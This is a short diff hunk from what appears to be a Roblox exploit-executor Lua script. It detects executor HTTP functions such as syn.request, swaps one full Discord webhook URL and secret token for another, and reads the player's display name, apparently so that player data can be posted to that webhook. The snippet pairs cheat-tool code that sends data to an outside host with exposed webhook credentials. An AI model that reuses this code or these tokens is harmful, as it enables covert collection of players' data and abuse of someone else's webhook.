@@ -153,7 +153,7 @@ local UserInputService = game:GetService("UserInputService")
 local HTTP = (syn and syn.request) or (http and http.request) or request or HttpPost
 if not HTTP then return end
 
-local WebhookURL = "https://discord.com/api/webhooks/1336375899280638013/mPQXIrX4v1sq6nZyz4EmO1zspVgKEvlXnDVsaJMNhfSaYbbVvB3N5b5rq5JTih_y1EY_"
+local WebhookURL = "https://ptb.discord.com/api/webhooks/1337758513207971921/5dYVm-peDq8ZEv6OsGlpuocejDQpNzsqoLmcGeaYwKuQRhTnsKarepOUfyeJO8LB7W9h"
 
 local player = Players.LocalPlayer
 local displayName = player.DisplayName
